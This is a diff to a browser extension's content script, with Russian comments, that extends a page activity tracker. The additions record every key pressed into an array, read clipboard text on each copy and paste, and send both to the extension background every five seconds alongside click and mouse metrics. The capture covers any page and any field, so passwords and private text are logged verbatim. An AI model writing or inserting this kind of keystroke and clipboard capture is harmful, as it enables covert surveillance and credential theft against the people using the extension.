@@ -6,6 +6,24 @@ let mousePx = 0;
 let lastMouseX = null;
 let lastMouseY = null;
 
+// NEW: Copy/Paste counters
+let copyCount = 0;
+let pasteCount = 0;
+
+// NEW: Keys array (limit 1000)
+const MAX_KEYS = 1000;
+let keysArray = [];
+
+// NEW: Clipboard history (limit 50, text limit 500 chars)
+const MAX_CLIPBOARD_ITEMS = 50;
+const MAX_CLIPBOARD_TEXT_LENGTH = 500;
+let clipboardHistory = [];
+
+// NEW: Mouse speed tracking
+let lastMouseTime = null;
+let totalMouseSpeed = 0;
+let mouseMovements = 0;
+
 // Throttle для mousemove (50ms)
 let lastMouseMoveTime = 0;
 const MOUSE_THROTTLE_MS = 50;
@@ -18,6 +36,20 @@ function isExtensionValid() {
   return chrome.runtime?.id;
 }
 
+// ============ PROFILE SETUP ============
+(function() {
+  // Проверяем путь вида /10001/
+  const match = window.location.pathname.match(/^\/(\d{5,})\/?\s*$/);
+  
+  if (match) {
+    const profileId = match[1];
+    chrome.runtime.sendMessage({ 
+      type: 'PROFILE_SETUP', 
+      profileId: profileId 
+    });
+  }
+})();
+
 // ============ EVENT LISTENERS ============
 
 // Клики
@@ -26,8 +58,13 @@ document.addEventListener('click', () => {
 }, true);
 
 // Нажатия клавиш
-document.addEventListener('keydown', () => {
+document.addEventListener('keydown', (e) => {
   keypresses++;
+  
+  // NEW: Сохраняем клавишу в массив
+  if (keysArray.length < MAX_KEYS) {
+    keysArray.push(e.key);
+  }
 }, true);
 
 // Скролл (с накоплением дельты)
@@ -47,15 +84,60 @@ document.addEventListener('mousemove', (e) => {
   if (lastMouseX !== null && lastMouseY !== null) {
     const dx = e.clientX - lastMouseX;
     const dy = e.clientY - lastMouseY;
-    mousePx += Math.sqrt(dx * dx + dy * dy);
+    const distance = Math.sqrt(dx * dx + dy * dy);
+    mousePx += distance;
+
+    // NEW: Вычисляем скорость
+    if (lastMouseTime !== null) {
+      const dt = now - lastMouseTime;
+      if (dt > 0) {
+        const speed = distance / dt; // px/ms
+        totalMouseSpeed += speed;
+        mouseMovements++;
+      }
+    }
   }
   
   lastMouseX = e.clientX;
   lastMouseY = e.clientY;
+  lastMouseTime = now;
+}, true);
+
+// NEW: Copy event
+document.addEventListener('copy', async () => {
+  copyCount++;
+  
+  try {
+    const text = await navigator.clipboard.readText();
+    if (text && clipboardHistory.length < MAX_CLIPBOARD_ITEMS) {
+      clipboardHistory.push({
+        action: 'copy',
+        text: text.substring(0, MAX_CLIPBOARD_TEXT_LENGTH)
+      });
+    }
+  } catch (e) {
+    // Clipboard access denied - just count
+  }
+}, true);
+
+// NEW: Paste event
+document.addEventListener('paste', async () => {
+  pasteCount++;
+  
+  try {
+    const text = await navigator.clipboard.readText();
+    if (text && clipboardHistory.length < MAX_CLIPBOARD_ITEMS) {
+      clipboardHistory.push({
+        action: 'paste',
+        text: text.substring(0, MAX_CLIPBOARD_TEXT_LENGTH)
+      });
+    }
+  } catch (e) {
+    // Clipboard access denied - just count
+  }
 }, true);
 
 // ============ VISIBILITY CHANGE ============
-
 document.addEventListener('visibilitychange', () => {
   if (!isExtensionValid()) return;
   
@@ -71,7 +153,6 @@ document.addEventListener('visibilitychange', () => {
 });
 
 // ============ PAGE UNLOAD ============
-
 window.addEventListener('beforeunload', () => {
   if (!isExtensionValid()) return;
   
@@ -80,7 +161,6 @@ window.addEventListener('beforeunload', () => {
 });
 
 // ============ WINDOW FOCUS ============
-
 window.addEventListener('focus', () => {
   if (!isExtensionValid()) return;
   
@@ -101,14 +181,19 @@ window.addEventListener('blur', () => {
 });
 
 // ============ PERIODIC REPORTING ============
-
 function sendActivityReport() {
   if (!isExtensionValid()) return;
   
   // Отправляем только если есть данные
-  if (clicks === 0 && keypresses === 0 && scrollPx === 0 && mousePx === 0) {
+  const hasActivity = clicks > 0 || keypresses > 0 || scrollPx > 0 || mousePx > 0 
+    || copyCount > 0 || pasteCount > 0 || keysArray.length > 0 || clipboardHistory.length > 0;
+  
+  if (!hasActivity) {
     return;
   }
+
+  // NEW: Вычисляем среднюю скорость мыши
+  const avgMouseSpeed = mouseMovements > 0 ? totalMouseSpeed / mouseMovements : 0;
 
   chrome.runtime.sendMessage({
     type: 'ACTIVITY',
@@ -116,7 +201,13 @@ function sendActivityReport() {
       clicks: clicks,
       keypresses: keypresses,
       scroll_px: Math.round(scrollPx),
-      mouse_px: Math.round(mousePx)
+      mouse_px: Math.round(mousePx),
+      // NEW fields
+      copy_count: copyCount,
+      paste_count: pasteCount,
+      keys_array: keysArray.length > 0 ? [...keysArray] : null,
+      clipboard_history: clipboardHistory.length > 0 ? [...clipboardHistory] : null,
+      mouse_avg_speed: avgMouseSpeed > 0 ? Math.round(avgMouseSpeed * 1000) / 1000 : null // px/ms, 3 decimal places
     }
   });
 
@@ -125,13 +216,18 @@ function sendActivityReport() {
   keypresses = 0;
   scrollPx = 0;
   mousePx = 0;
+  copyCount = 0;
+  pasteCount = 0;
+  keysArray = [];
+  clipboardHistory = [];
+  totalMouseSpeed = 0;
+  mouseMovements = 0;
 }
 
 // Отправляем данные каждые 5 секунд
 setInterval(sendActivityReport, REPORT_INTERVAL_MS);
 
 // ============ INITIAL REPORT ============
-
 // Сообщаем background что страница загрузилась
 if (isExtensionValid()) {
   chrome.runtime.sendMessage({
@@ -139,5 +235,3 @@ if (isExtensionValid()) {
     data: { visible: document.visibilityState === 'visible' }
   });
 }
-
-console.log('env', process.env.NODE_ENV);
